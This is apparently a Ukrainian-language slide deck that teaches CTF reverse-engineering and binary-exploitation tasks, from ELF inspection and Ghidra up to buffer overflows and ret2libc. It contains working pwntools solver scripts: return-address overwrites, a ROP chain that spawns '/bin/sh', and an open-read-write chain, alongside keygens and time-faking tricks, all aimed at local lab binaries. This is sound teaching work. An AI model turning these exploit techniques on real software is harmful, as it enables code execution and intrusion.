---
theme: default
background: https://images.unsplash.com/photo-1754357906539-7ae638a49740?q=80&w=2070
class: text-center
highlighter: shiki
lineNumbers: true
info: |
  ## Створення завдань RE/PWN для CTF
drawings:
  persist: false
transition: slide-left
title: Створення завдань RE/PWN для CTF
mdc: true
---

# Створення завдань RE/PWN для CTF

---

# RE: Reverse Engineering

**Мета**: Аналіз бінарних файлів для розуміння логіки

- 🔍 Статичний аналіз: strings, objdump, readelf
- 🐛 Динамічний аналіз: GDB, strace
- 🧩 Декомпіляція: Ghidra, IDA
- 📈 Прогресія: від інвентаризації до system calls

---

# PWN: Binary Exploitation

**Мета**: Експлуатація вразливостей пам'яті

- 💥 Buffer overflow: перезапис return address
- 🔗 ROP chains: обхід NX захисту
- 📍 Address leak: bypass ASLR/PIE
- 🎯 Прогресія: від netcat до ret2libc
---

# Task 01: Що таке ELF?

Структура виконуваних файлів Linux

```
┌─────────────────────┐
│  ELF Header         │  ← Метадані
├─────────────────────┤
│  Program Headers    │  ← Для завантаження
├─────────────────────┤
│  Sections           │  ← Код, дані
├─────────────────────┤
│  Section Headers    │  ← Опис секцій
└─────────────────────┘
```

**Little Endian**: `0x12345678` → `78 56 34 12`

---

# Task 01: Інструмент file

Визначення типу файлу

```bash
file build/re101
```

**Вивід:**
```
ELF 64-bit LSB executable, x86-64
dynamically linked
not stripped
```

**Що дізнались**: архітектура, linkage, symbols

---

# Task 01: Інструмент readelf

Читання ELF структур

````md magic-move
```bash
readelf -h build/re101
# ELF заголовок
```

```bash
# Entry point address: 0x400430
# Number of sections: 30
# Machine: x86-64
```
````

**Корисно**: `-l` (segments), `-S` (sections), `-s` (symbols)

---

# Task 01: Інструмент objdump

Дизасемблювання та символи

```bash
objdump -T build/re101
# DYNAMIC SYMBOL TABLE:
# puts, strcmp, __libc_start_main
```

**Що бачимо**: імпортовані функції з libc

---

# Task 01: Інструмент strings

Витягування текстових рядків

```bash
strings -a build/re101 | head -20
```

**Опції:**
- `-a` - сканувати весь файл
- `-n <num>` - мінімальна довжина

**Навчання**: Пошук прихованої інформації

---

# Task 01: Покрокове рішення

Послідовність аналізу

```bash
file build/re101              # Крок 1
readelf -h build/re101         # Крок 2
objdump -T build/re101         # Крок 3
strings -a build/re101         # Крок 4
```

**Методологія**: Завжди починати з інвентаризації

---

# Task 02: Hardcoded Secrets

Небезпека вшитих секретів у код

```c
// ❌ ПОГАНО
const char *key = "MyS3cr3tP@ssw0rd";

// ✅ ДОБРЕ
const char *key = getenv("APP_PASSWORD");
```

**Проблеми**: витік через strings, git історія, неможливо змінити

---

# Task 02: Як працює strings?

Сканування друкованих символів

```bash
strings -a build/re102
# S3R14L-ABCD-1337  ← Знайдено!
```

**Параметри**: мінімум 4 символи підряд (ASCII/UTF-8)

---

# Task 02: Regular Expressions

Базовий синтаксис для grep

```bash
# Спеціальні символи
.     # Будь-який символ
*     # 0 або більше
+     # 1 або більше
^     # Початок рядка
$     # Кінець рядка
```

**Приклад**: `[A-Z0-9]+-[A-Z0-9]+` для серійників

---

# Task 02: Пошук серійників

Фільтрація через grep

````md magic-move
```bash
strings -a build/re102
# Багато рядків...
```

```bash
strings -a build/re102 | grep -E '[A-Z0-9]+-[A-Z0-9]+'
# S3R14L-ABCD-1337
```
````

**Техніка**: Regex для знаходження паттернів

---

# Task 02: Перевірка знайденого

Тестування серійника

```bash
./build/re102 Alice S3R14L-ABCD-1337
# FLAG{task2_ok_Alice}
```

**Успіх**: Hardcoded ключ знайдено!

---

# Task 02: Захист від витягування

Методи обфускації рядків

```c
// XOR encoding
const char encoded[] = {0x53^0xAA, 0x45^0xAA, ...};
char *key = decode_xor(encoded, 0xAA);

// Хешування
const char *hash = "a94a8fe5ccb19ba61...";
if (sha1(input) == hash) { ... }
```

**Ефективність**: Ускладнює, але не запобігає

---

# Task 03: Що таке ROT13?

Простий шифр заміни

```
A B C ... M N O P ... Z
↓ ↓ ↓     ↓ ↓ ↓ ↓     ↓
N O P ... Z A B C ... M
```

**Приклади:**
- `HELLO` → `URYYB`
- `Alice` → `Nyvpr`

**Властивість**: ROT13(ROT13(x)) = x

---

# Task 03: Чому strings не допоможе?

Динамічна генерація

```bash
strings -a build/re103 | grep -i flag
# FLAG{task3_ok_%s}  ← Формат є, але не серійник!
```

**Причина**: Серійник генерується під час виконання

---

# Task 03: Запуск через GDB

Динамічний аналіз

````md magic-move
```bash
gdb build/re103
```

```bash
(gdb) break strcmp
(gdb) run Alice TEST123
```

```bash
(gdb) x/s $rdi
0x...: "Nyvpr"    ← ROT13 від Alice!
```
````

**Виявлення**: Алгоритм трансформації

---

# Task 03: x86-64 регістри

Основні регістри процесора

```
┌─────────┬──────────────────────────┐
│ rax     │ Return value             │
│ rdi     │ 1-й аргумент функції     │
│ rsi     │ 2-й аргумент             │
│ rdx     │ 3-й аргумент             │
│ rip     │ Instruction Pointer      │
│ rsp     │ Stack Pointer            │
│ rbp     │ Base Pointer             │
└─────────┴──────────────────────────┘
```

**Calling Convention**: rdi, rsi, rdx, rcx, r8, r9, стек

---

# Task 03: Команда x/s в GDB

Перегляд пам'яті як рядка

```bash
x/s $rdi
# x = examine
# /s = string format
# $rdi = регістр rdi
```

**Результат**: Трансформований рядок в пам'яті

---

# Task 03: Генерація ROT13

Python implementation

```python
def rot13(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char)-ord('a')+13)%26+ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char)-ord('A')+13)%26+ord('A')))
        else:
            result.append(char)
    return ''.join(result)
```

---

# Task 03: Альтернатива - ltrace

Трасування бібліотечних викликів

```bash
ltrace ./build/re103 Alice TEST123
# strcmp("Nyvpr", "TEST123") = -44
```

**Простіше**: Одразу видно порівняння!

---

# Task 04: ROT-N зі strlen

Зсув залежить від довжини

```c
int n = strlen(name) % 26;
serial = ROT-N(name, n);
```

**Приклад**: `Alice` (5 літер) → ROT-5 → `Fqnhj`

---

# Task 04: Відкриття у Ghidra

Покрокова інструкція

**Кроки:**
1. Запустити Ghidra
2. Create New Project
3. Import File → `build/re104`
4. Auto-analyze → Yes
5. Symbol Tree → Functions → main

**Результат**: Декомпільований C код

---

# Task 04: Інтерфейс Ghidra

Три основні панелі

```
┌──────────┬───────────┬─────────────┐
│ Symbol   │ Listing   │ Decompile   │
│ Tree     │ (ASM)     │ (C code)    │
│          │           │             │
│Functions │  push rbp │ int main()  │
│ └─main   │  mov rbp  │ {           │
│ └─rot_n  │  sub rsp  │   strlen()  │
│          │           │ }           │
└──────────┴───────────┴─────────────┘
```

**Decompile** - найважливіше вікно!

---

# Task 04: Декомпільований код

Аналіз у Ghidra

```c
undefined8 main(int argc, char **argv) {
  size_t nameLen;
  nameLen = strlen(name);      // ← Довжина
  int N = (int)nameLen % 26;    // ← Формула!
  rot_apply(buffer, name, N);
  // ...
}
```

**Знайдено**: Алгоритм обчислення зсуву

---

# Task 04: Написання кейгена

Python keygen

```python
def rot_n(text, n):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char)-ord('a')+n)%26+ord('a')))
        # ... великі літери
    return ''.join(result)

name = "Alice"
n = len(name) % 26  # 5
serial = rot_n(name, n)  # "Fqnhj"
```

---

# Task 05: Time-based алгоритм

Зсув змінюється кожної секунди

```c
time_t t = time(NULL);
int N = (int)(t % 20);
serial = ROT-N(name, N);
```

**Проблема**: Серійник дійсний лише 1 секунду!

---

# Task 05: Python basics

Базовий синтаксис для новачків

```python
x = 5                  # Змінна
text = "Hello"         # Рядок

def function(param):   # Функція
    result = param + 1
    return result

for char in text:      # Цикл
    print(char)
```

**Відступи**: 4 пробіли (важливо!)

---

# Task 05: Генерація серійника

Time-based keygen

````md magic-move
```python
import time

t = int(time.time())
n = t % 20
```

```python
import time

def generate_serial(name):
    t = int(time.time())
    n = t % 20
    return rot_n(name, n)
```
````

**ШВИДКО**: Між генерацією та використанням < 1 сек!

---

# Task 05: Автоматизація

Bash one-liner

```bash
name="Alice"
serial=$(python3 keygen.py "$name" | grep Serial | awk '{print $3}')
./build/re105 "$name" "$serial"
```

**Або**: Повністю в Python з subprocess

---

# Task 05: Time manipulation

Атака на time-based

```bash
# Заморозити системний час
sudo date -s "2024-01-01 12:00:00"

# Або libfaketime
LD_PRELOAD=/usr/lib/faketime/libfaketime.so.1 \
  FAKETIME="2024-01-01 12:00:00" ./build/re105 Alice <serial>
```

**Альтернатива**: Bruteforce 0-19 (завжди спрацює один)

---

# Task 06: Що таке UPX?

Ultimate Packer for eXecutables

**Що робить:**
- Стискає бінарник (50-70% менше)
- Додає розпаковувач (stub)
- При запуску: розпаковує → виконує

**Використання**: Зменшення розміру або приховування

---

# Task 06: Як працює UPX

Механізм пакування

```
Оригінал → Стискання → +Stub → Упакований
(re106)                          (re106_packed)

При запуску:
1. Stub розпаковує в пам'ять
2. Передає управління
3. Програма працює нормально
```

---

# Task 06: Розпізнавання UPX

Виявлення упакованих файлів

````md magic-move
```bash
file build/re106_packed
# ELF 64-bit ... stripped
```

```bash
strings -a build/re106_packed | head
# UPX!
# $Info: This file is packed with UPX...
```
````

**Ознака**: Рядок "UPX!" у файлі

---

# Task 06: Розпакування

UPX команди

```bash
# Розпакування
upx -d build/re106_packed -o build/re106_unpacked

# Пакування
upx -9 binary

# Інформація
upx -l packed_binary
```

**Після розпакування**: Аналіз як звичайно

---

# Task 06: Захист від розпакування

Modified UPX

```bash
# Пакування
upx -9 binary

# Зміна сигнатури hex-редактором
# "UPX!" → щось інше

# Тепер upx -d не спрацює автоматично!
```

**Обхід**: Відновити сигнатуру або дамп з пам'яті

---

# Task 07: Що таке strace?

Трасування системних викликів

**Показує:**
- Виклики функцій ядра (open, read, socket)
- Аргументи та результати
- Сигнали та помилки

**Застосування**: Виявлення прихованої поведінки

---

# Task 07: Що таке fork()?

Створення дочірнього процесу

```
До fork():
┌──────────────┐
│ Процес (PID) │
└──────────────┘

Після fork():
┌─────────┐    ┌─────────┐
│ Батько  │    │ Дитина  │
│ (PID)   │    │(новий PID)│
└─────────┘    └─────────┘
```

**Використання**: Приховування активності

---

# Task 07: Виклик fork() у коді

Як це працює

```c
pid_t pid = fork();

if (pid == 0) {
    // Дочірній процес
    start_http_server();
} else if (pid > 0) {
    // Батьківський процес
    exit(0);  // Швидко завершується
}
```

**Ефект**: Здається що програма нічого не робить

---

# Task 07: strace з fork

Опція -f для дочірніх процесів

````md magic-move
```bash
strace ./build/re107 Alice
# Без -f: тільки батько
```

```bash
strace -f ./build/re107 Alice
# З -f: батько + дитина
```

```bash
strace -f -e trace=%network ./build/re107 Alice
# Тільки мережеві виклики!
```
````

---

# Task 07: Виявлення HTTP сервера

Аналіз мережевих викликів

```bash
# У трасі:
socket(AF_INET, SOCK_STREAM, ...) = 3
bind(3, {sin_port=htons(31337),
         sin_addr=inet_addr("127.0.0.1")}, 16) = 0
listen(3, 8) = 0
```

**Знайдено**: Порт 31337 на localhost!

---

# Task 07: Підключення

Отримання FLAG

```bash
# У новому терміналі
curl http://127.0.0.1:31337/?name=Alice
# FLAG{task7_ok_Alice}
```

**Або автоматизація**: Запуск у фоні + curl

---

# Task 07: strace опції

Корисні параметри

```bash
strace -f               # Форки
strace -e trace=%file   # Файлові операції
strace -e trace=%network # Мережа
strace -s 1000          # Довгі рядки
strace -o file.txt      # Вивід у файл
strace -t               # З часом
```

---

# Висновки: RE

Ключові принципи

- 📈 **Прогресія**: strings → GDB → Ghidra → strace
- 🛠️ **Інструменти**: Кожен для своєї задачі
- 🎓 **Навчання**: Від статичного до динамічного
- 📝 **Методологія**: Починати з інвентаризації

**7 завдань** покривають повний спектр базового RE

---

# Stage 01: Що таке TCP/IP?

Протокол передачі даних

**Аналогія**: Телефонний дзвінок
1. Дзвонити (підключитись)
2. Співрозмовник відповідає (accept)
3. Розмова (обмін даними)
4. Покласти слухавку (close)

**netcat** - швейцарський ножик для мережі

---

# Stage 01: File Descriptors

Ідентифікатори відкритих файлів

```
┌────┬────────────────────────┐
│ 0  │ stdin  (ввід)          │
│ 1  │ stdout (вивід)         │
│ 2  │ stderr (помилки)       │
│ 3+ │ Інші файли/з'єднання   │
└────┴────────────────────────┘
```

**У коді**: `read(0, ...)`, `dprintf(1, ...)`

---

# Stage 01: Аналіз коду сервера

Покрокове виконання

```c
int s = tcp_listen("127.0.0.1", 7101);  // 1
int c = tcp_accept_one(s);               // 2
dprintf(c, "say HELLO or GIMME FLAG\n"); // 3
char buf[256]={0};
read(c, buf, 255);                       // 4
if (strstr(buf, "GIMME FLAG"))           // 5
    dprintf(c, "FLAG{...}\n");
```

---

# Stage 01: Підключення netcat

Базова взаємодія

````md magic-move
```bash
nc 127.0.0.1 7101
```

```bash
nc 127.0.0.1 7101
say HELLO or GIMME FLAG
```

```bash
nc 127.0.0.1 7101
say HELLO or GIMME FLAG
GIMME FLAG
FLAG{STAGE1_HELLO}
```
````

---

# Stage 01: Troubleshooting

Поширені проблеми

**"Connection refused"** → Сервер не запущений

**"Address already in use"** → Порт зайнятий
```bash
lsof -i :7101
kill -9 <PID>
```

**Нічого не відбувається** → Натисніть Enter!

---

# Stage 02: Stack Canary

Захист від buffer overflow

```
┌────────────┐
│ Saved RIP  │
├────────────┤
│ Saved RBP  │
├────────────┤
│ **CANARY** │ ← Секретне значення!
├────────────┤
│ buf[64]    │
└────────────┘
```

**Перевірка**: При виході з функції canary має збігатися

---

# Stage 02: Як працює Canary

Assembly код

````md magic-move
```asm
; При вході:
mov rax, QWORD PTR fs:0x28
mov QWORD PTR [rbp-0x8], rax
```

```asm
; При виході:
mov rax, QWORD PTR [rbp-0x8]
xor rax, QWORD PTR fs:0x28
je .L_ok
call __stack_chk_fail  # PANIC!
```
````

**Якщо змінилась**: `*** stack smashing detected ***`

---

# Stage 02: NX (No eXecute)

Заборона виконання в стеку

```
┌─────────┬──────┬────────────┐
│ .text   │ ✅ X │ ❌ W       │
│ .data   │ ❌ X │ ✅ W       │
│ Stack   │ ? X  │ ✅ W       │
└─────────┴──────┴────────────┘
```

**NX ON**: Stack ❌ виконуваний → потрібен ROP
**NX OFF**: Stack ✅ виконуваний → можна shellcode

---

# Stage 02: PIE + ASLR

Рандомізація адрес

```
Без PIE:
./binary → 0x400000 (завжди)
./binary → 0x400000 (завжди)

З PIE + ASLR:
./binary → 0x555555554000
./binary → 0x5555557 8a000 (різні!)
```

**Обхід**: Потрібен leak адреси

---

# Stage 02: RELRO

Захист GOT/PLT таблиць

**No RELRO**: GOT записуваний (GOT overwrite можливий)

**Partial RELRO**: `.got.plt` все ще доступний

**Full RELRO**: Все read-only (неможливо перезаписати)

**Перевірка**: `readelf -d binary | grep BIND_NOW`

---

# Stage 02: Інструмент checksec

Аналіз захистів

```bash
checksec --file=binary
```

**Вивід:**
```
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

**Використання**: Вибір стратегії експлуатації

---

# Stage 03: Чому pwntools?

Проблеми з netcat

**Netcat:**
- ❌ Ручне введення (повільно)
- ❌ Бінарні дані складно
- ❌ Немає автоматизації

**Pwntools:**
- ✅ Автоматизація
- ✅ Бінарні дані легко
- ✅ Debugging вбудований

---

# Stage 03: Підключення

remote() та process()

````md magic-move
```python
from pwn import *
```

```python
from pwn import *
io = remote('127.0.0.1', 7101)
```

```python
from pwn import *
io = remote('127.0.0.1', 7101, timeout=5)
io = process('./binary')  # Локально
```
````

---

# Stage 03: Отримання даних

recv функції

```python
io.recv(1024)            # До 1024 байт
io.recvline()            # До \n
io.recvuntil(b'prompt')  # До певного рядка
io.recvall(timeout=2)    # Все (з таймаутом)
```

**Найчастіше**: `recvuntil()` для банерів

---

# Stage 03: Відправка даних

send функції

```python
io.send(b'data')         # Без \n
io.sendline(b'data')     # З \n
io.sendafter(b'>', b'cmd')  # Після prompt
```

**Важливо**: Використовувати `b'...'` (bytes)

---

# Stage 03: Пакування даних

p64() та u64()

````md magic-move
```python
address = 0x401136
```

```python
address = 0x401136
packed = p64(address)
# b'\x36\x11\x40\x00\x00\x00\x00\x00'
```

```python
leaked = b'\x90\x78\x56\x34\x12\x7f\x00\x00'
address = u64(leaked)  # 0x7f3456789090
```
````

**Little Endian**: Автоматична конвертація

---

# Stage 03: ELF операції

Робота з бінарником

```python
elf = ELF('./binary', checksec=False)

elf.symbols['win']    # Адреса функції
elf.plt['puts']       # PLT entry
elf.got['puts']       # GOT entry
elf.bss(0x100)        # BSS + offset
```

**Зручно**: Не треба objdump!

---

# Stage 03: Logging

Контроль виводу

```python
context.log_level = 'debug'   # Все
context.log_level = 'info'    # Основне
context.log_level = 'warning' # Мінімум
context.log_level = 'error'   # Помилки
```

**Debugging**: `debug` показує весь трафік

---

# Stage 03: Cyclic pattern

Знаходження offset

```python
# Генерація
pattern = cyclic(200)

# Пошук
offset = cyclic_find(0x6161616c)  # 'laaa'
```

**Швидко**: Унікальні 4-байтні підрядки

---

# Stage 04: Function pointers

Що це таке?

```c
void win() { printf("FLAG\n"); }

void (*fp)() = win;  // Вказівник на функцію
fp();                 // Виклик через вказівник
```

**Концепція**: Адреса → Виконання

---

# Stage 04: CPU level

Як працює виклик

````md magic-move
```asm
call 0x401136    # Прямий виклик
```

```asm
mov rax, 0x401136
call rax          # Виклик через регістр
```

```asm
mov rax, [rbp-0x8]  # Читання з пам'яті
call rax             # Виклик за адресою
```
````

---

# Stage 04: Знаходження адрес

Методи отримання адреси win()

````md magic-move
```bash
objdump -d binary | grep '<win>'
# 0000000000401136 <win>:
```

```python
from pwn import *
elf = ELF('./binary', checksec=False)
print(hex(elf.symbols['win']))
# 0x401136
```
````

**Рекомендовано**: pwntools (найпростіше)

---

# Stage 04: Що таке p64()?

Пакування у little endian

```python
p64(0x401136)
# b'\x36\x11\x40\x00\x00\x00\x00\x00'
#    ↓    ↓    ↓    ↓    ↓    ↓    ↓    ↓
# LSB                              MSB
```

**Чому 8 байт?**: 64-бітна архітектура

---

# Stage 04: Solver

Повний експлойт

```python
from pwn import *

elf = ELF('build/stage04', checksec=False)
io = remote('127.0.0.1', 7104)

io.send(p64(elf.symbols['win']))
print(io.recvall(timeout=1).decode())
```

---

# Stage 05: Stack frame

Анатомія стекового фрейму

```
┌─────────┐ ← Вища адреса
│ RIP     │ [rbp+8]   ← Куди повернутися
├─────────┤
│ RBP     │ [rbp]     ← Збережений RBP
├─────────┤
│ buf[64] │ [rbp-64]  ← Локальний буфер
└─────────┘ ← Нижча адреса
```

**Offset**: Відстань від buf[0] до RIP

---

# Stage 05: NEED hint

Інтерактивна підказка

```c
if (received < OFFSET + 8) {
    int need = (OFFSET + 8) - received;
    dprintf(c, "NEED=%d\n", need);
}
```

**Використання**: Сервер сам каже скільки байтів треба

---

# Stage 05: Методи пошуку offset

4 способи

**1. Server hints** (our case) - сервер підказує

**2. GDB** - точно і візуально

**3. Cyclic pattern** - найшвидше

**4. Binary search** - автоматизовано

---

# Stage 05: GDB метод

Візуальне знаходження

````md magic-move
```bash
gdb ./binary
run < <(python3 -c "print('A'*100)")
```

```bash
# Segfault: RIP = 0x4141414141414141
# Зменшуємо до 80...
run < <(python3 -c "print('A'*80)")
```

```bash
# Segfault: RIP = 0x4141414141414141
# Зменшуємо до 72...
run < <(python3 -c "print('A'*72+'\xef\xbe\xad\xde')")
# RIP = 0xdeadbeef → Offset = 72!
```
````

---

# Stage 05: Чому offset ≠ sizeof(buf)?

Compiler alignment

```
buf[64]     64 bytes
padding     0-15 bytes (align to 16)
saved RBP   8 bytes
saved RIP   8 bytes (offset = 64+padding+8)
```

**Наш випадок**: 64 + 0 + 8 = 72 байти

---

# Stage 05: Payload структура

Byte-by-byte breakdown

```python
payload = b'A' * 72          # buf + RBP
payload += p64(win_address)  # RIP

# [0..63]: buf[64] заповнений 'A'
# [64..71]: saved RBP = 'AAAAAAAA'
# [72..79]: saved RIP = адреса win()
```

---

# Stage 06: Що таке Buffer Overflow?

Визначення та небезпека

**Нормально:**
```
read(64) → buf[64]  ✅
```

**Overflow:**
```
read(100) → buf[64] → ... → RIP ❌
```

**Наслідок**: Контроль виконання програми

---

# Stage 06: Чому це працює?

Return mechanism

````md magic-move
```c
void vuln() {
    char buf[64];
    gets(buf);  // Overflow!
    return;     // ← Що тут відбувається?
}
```

```asm
; return в assembly:
leave    ; mov rsp, rbp; pop rbp
ret      ; pop rip; jmp rip
```

```
; Якщо RIP перезаписаний:
pop rip  → rip = адреса win()
jmp rip  → виконується win()!
```
````

---

# Stage 06: Вразливий код

Аналіз сервера

```c
void vuln() {
    char buf[64];
    read(0, buf, 256);  // ← Overflow!
    // 256 байт у буфер розміром 64!
}

void win() {
    printf("FLAG{...}\n");
}
```

---

# Stage 06: Frame 0 - Start

Програма запускається

```
┌──────────┐
│ main()   │ ← Виконується
│   ...    │
│ call vuln│ ← Наступна інструкція
└──────────┘

Stack: [empty]
```

---

# Stage 06: Frame 1 - Call

main() викликає vuln()

```
┌──────────┐
│ vuln()   │ ← Переходимо сюди
│   ...    │
└──────────┘

Stack:
┌──────────┐
│ ret→main │ ← Збережена адреса повернення
└──────────┘
```

---

# Stage 06: Frame 2 - Prologue

vuln() створює свій frame

```
vuln():
  push rbp       # Зберегти RBP
  mov rbp, rsp   # Новий RBP
  sub rsp, 64    # Місце для buf

Stack:
┌──────────┐
│ buf[64]  │
├──────────┤
│saved RBP │
├──────────┤
│ ret→main │
└──────────┘
```

---

# Stage 06: Frame 3 - Read

read() виконується

```c
read(0, buf, 256);  // ← ТОТУТ!
// Чекаємо вводу...
```

**Користувач відправляє:** 80 байт
- 72 байти 'A'
- 8 байт адреса win()

---

# Stage 06: Frame 4 - OVERFLOW!

Стек після read()

```
Stack:
┌──────────┐
│'AAAAAAAA'│ ← buf[0..63]
├──────────┤
│'AAAAAAAA'│ ← saved RBP перезаписаний!
├──────────┤
│ 0x401136 │ ← saved RIP = win()!
└──────────┘
```

**Перезаписано**: RIP тепер вказує на win()

---

# Stage 06: Frame 5 - Return

vuln() повертається

```asm
leave    # rsp = rbp; pop rbp
         # rbp = 'AAAAAAAA' (не важливо)
ret      # pop rip; jmp rip
         # rip = 0x401136
         # Стрибок до win()!
```

---

# Stage 06: Frame 6 - SUCCESS

win() виконується

```c
void win() {
    printf("FLAG{...}\n");  // ← Виконується!
}
```

**🎉 Експлойт успішний!**

---

# Stage 06: Небезпечні функції

Vulnerable functions

**Дуже небезпечні:**
- `gets()` - немає обмеження
- `scanf("%s")` - немає обмеження
- `strcpy()` - не перевіряє розмір
- `strcat()` - може переповнити

**Безпечні альтернативи:**
- `fgets(buf, size, stdin)`
- `snprintf(buf, size, ...)`
- `strncpy(dst, src, size)`

---

# Stage 06: Real CVE

Реальні приклади

**CVE-2014-0160 (Heartbleed):**
- Buffer over-read в OpenSSL
- Витік пам'яті через TLS heartbeat
- 17% серверів світу вразливі

**CVE-2020-1350 (SIGRed):**
- Buffer overflow в Windows DNS
- Wormable (саморозповсюджуваний)
- CVSS 10.0 (максимальна загроза)

---

# Stage 07: Що таке ASLR?

Address Space Layout Randomization

````md magic-move
```
Без ASLR:
./binary → puts @ 0x7ffff7a62aa0
./binary → puts @ 0x7ffff7a62aa0 (same!)
```

```
З ASLR:
./binary → puts @ 0x7f1234567aa0
./binary → puts @ 0x7f9876543aa0 (різні!)
```
````

**Проблема**: Не можна hardcode адреси

---

# Stage 07: Рішення - Leak

3-крокова стратегія

**1. LEAK** → Витягуємо адресу з процесу

**2. CALCULATE** → Розраховуємо базу libc

**3. EXPLOIT** → Будуємо payload з правильними адресами

---

# Stage 07: Анатомія libc - FILE

libc.so.6 на диску

```
libc.so.6 (файл):
┌────────────────┐ 0x00000
│ ELF Header     │
├────────────────┤ 0x29d90
│ puts()         │ ← Фіксований offset
├────────────────┤ 0x50d70
│ system()       │ ← Фіксований offset
├────────────────┤
│ ...            │
└────────────────┘
```

**Офсети завжди однакові** у файлі

---

# Stage 07: Анатомія libc - MEMORY Run 1

Завантаження у пам'ять (перший запуск)

```
Memory (Run 1):
┌────────────────┐ 0x7f1234500000 ← base (random!)
│ ELF Header     │
├────────────────┤ 0x7f1234529d90
│ puts()         │ ← base + 0x29d90
├────────────────┤ 0x7f1234550d70
│ system()       │ ← base + 0x50d70
└────────────────┘
```

**База випадкова, але офсети +однакові**

---

# Stage 07: Анатомія libc - MEMORY Run 2

Завантаження у пам'ять (другий запуск)

```
Memory (Run 2):
┌────────────────┐ 0x7f9876a00000 ← інша база!
│ ELF Header     │
├────────────────┤ 0x7f9876a29d90
│ puts()         │ ← base + 0x29d90 (той же +offset!)
├────────────────┤ 0x7f9876a50d70
│ system()       │ ← base + 0x50d70 (той же +offset!)
└────────────────┘
```

**Ключ**: Офсети фіксовані, база змінюється

---

# Stage 07: Математика leak

Обчислення бази libc

````md magic-move
```python
# Дано:
leaked_puts = 0x7f1234529d90  # З LEAK команди
offset_puts = 0x29d90          # З libc.so.6
```

```python
# Формула:
# leaked_addr = base + offset
# Отже:
base = leaked_puts - offset_puts
base = 0x7f1234529d90 - 0x29d90
base = 0x7f1234500000
```

```python
# Перевірка: база має закінчуватись на 000
if base & 0xfff != 0:
    print("ERROR: Invalid base!")
```
````

---

# Stage 07: Знаходження offset - pwntools

Найпростіший спосіб

```python
from pwn import *

libc = ELF('libc.so.6', checksec=False)

# Отримати offset
offset = libc.sym['puts']
print(hex(offset))  # 0x29d90

# Або для system
system_offset = libc.sym['system']
```

**Рекомендовано**: Завжди використовувати pwntools

---

# Stage 07: Знаходження offset - readelf

Ручний метод

```bash
readelf -s libc.so.6 | grep ' puts@@'
# 1353: 0000000000029d90  512 FUNC  GLOBAL DEFAULT  15 puts@@GLIBC_2.2.5
#                 ↑
#            Offset!
```

**Колонка 2**: Value = offset функції

---

# Stage 07: dlsym() пояснення

Команда LEAK у сервері

```c
void *handle = dlopen(NULL, RTLD_NOW);
void *puts_addr = dlsym(handle, "puts");
printf("PUTS=%p\n", puts_addr);
```

**Що робить**: Повертає реальну адресу `puts` у пам'яті

---

# Stage 07: Experiment

Багаторазовий запуск

```bash
for i in {1..5}; do
  echo "LEAK" | nc 127.0.0.1 7107
done
```

**Результат**: 5 різних адрес (ASLR працює!)

---

# Stage 07: Важливі нюанси

Критичні моменти

**1. Версія libc КРИТИЧНА!**
- Офсети різні у різних версіях
- Використовувати libc з контейнера

**2. Адреси вирівняні:**
- База завжди на межі сторінки (4KB)
- Завжди закінчується на `000`

**3. Один leak = вся libc:**
- Знаючи одну функцію → знаємо всі

---

# Stage 08: Що таке ret2libc?

Виклик функцій з libc

**Проблема**: NX = On (shellcode не виконається)

**Рішення**: Використати існуючий код з libc
- `system("/bin/sh")` → запустити shell
- Або ORW (open-read-write)

---

# Stage 08: Що таке ROP?

Return Oriented Programming

**Ідея**: Ланцюжок `ret` інструкцій

```asm
gadget1:
    pop rdi
    ret

gadget2:
    pop rsi
    ret
```

**Використання**: Встановити параметри + викликати функцію

---

# Stage 08: Що таке gadget?

Маленькі шматки коду

**Gadget** = інструкція + `ret`

```asm
pop rdi          # Взяти зі стеку у rdi
ret              # Перейти далі
```

**Пошук**: `ROPgadget --binary libc.so.6`

---

# Stage 08: ROP chain структура

Stack layout

```
┌────────────┐
│ 'A' * 72   │ ← Заповнення
├────────────┤
│ pop rdi    │ ← Gadget 1
├────────────┤
│ "/bin/sh"  │ ← Аргумент для rdi
├────────────┤
│ system()   │ ← Адреса функції
└────────────┘
```

---

# Stage 08: Frame 0 - ROP START

Після return з bof()

```
Stack:
┌────────────┐
│ pop_rdi    │ ← rsp тут
├────────────┤
│ binsh_addr │
├────────────┤
│ system_addr│
└────────────┘

rip = ??? (щойно повернулися)
```

---

# Stage 08: Frame 1 - Return

`ret` виконується

```asm
ret  # pop rip; jmp rip
```

```
rip = pop_rdi  ← Взято зі стеку
Stack:
┌────────────┐
│ binsh_addr │ ← rsp тепер тут
├────────────┤
│ system_addr│
└────────────┘
```

**Стрибок до gadget!**

---

# Stage 08: Frame 2 - Gadget

`pop rdi; ret` виконується

```asm
pop rdi  # rdi = binsh_addr
ret      # Наступна інструкція
```

```
rdi = "/bin/sh" адреса
Stack:
┌────────────┐
│ system_addr│ ← rsp тут
└────────────┘
```

---

# Stage 08: Frame 3 - System

Виклик system("/bin/sh")

```
rdi = "/bin/sh"
rip = system

system(rdi) → system("/bin/sh")
→ Shell запускається!
```

**🎉 ROP успішний!**

---

# Stage 08: Calling Convention

Чому RDI?

```
┌─────┬─────────────────┐
│ 1-й │ RDI             │
│ 2-й │ RSI             │
│ 3-й │ RDX             │
│ 4-й │ RCX             │
│ 5-й │ R8              │
│ 6-й │ R9              │
│ 7+  │ Stack           │
└─────┴─────────────────┘
```

**Приклад**: `system(cmd)` → cmd у RDI

---

# Stage 08: File Descriptors

Чому fd=3 для open()?

```
┌────┬─────────────────┐
│ 0  │ stdin           │
│ 1  │ stdout          │
│ 2  │ stderr          │
│ 3  │ Перший файл!    │
│ 4  │ Другий файл     │
└────┴─────────────────┘
```

**open()** повертає найменший вільний FD = 3

---

# Stage 08: Експлойт - Variant A

system("/bin/sh")

```python
from pwn import *

# ... leak base ...
rop = ROP(libc)
binsh = next(libc.search(b'/bin/sh\x00'))

rop.system(binsh)
payload = b'A'*72 + rop.chain()
io.send(payload)
io.interactive()
```

---

# Stage 08: Експлойт - Variant B (ORW)

Open-Read-Write

```python
rop = ROP(libc)

rop.open(next(libc.search(b'/flag\x00')), 0)
rop.read(3, elf.bss(0x200), 0x100)
rop.write(1, elf.bss(0x200), 0x100)

payload = b'A'*72 + rop.chain()
```

**Переваги**: Працює навіть з seccomp

---

# Stage 08: Чому ORW краще?

Переваги над shell

**Seccomp filters:**
- Може блокувати `execve`
